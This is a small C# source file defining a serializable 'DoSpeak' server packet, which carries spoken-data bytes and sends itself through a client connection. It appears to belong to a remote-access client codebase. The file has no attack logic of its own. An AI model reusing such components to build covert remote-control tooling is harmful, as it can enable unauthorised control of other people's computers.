using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets {

    [Serializable]
    public class DoSpeak : IPacket {

        public byte[] SpokenData { get; set; }

        public DoSpeak() {
            
        }

        public DoSpeak(byte[] spokenData) {
            SpokenData = spokenData;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
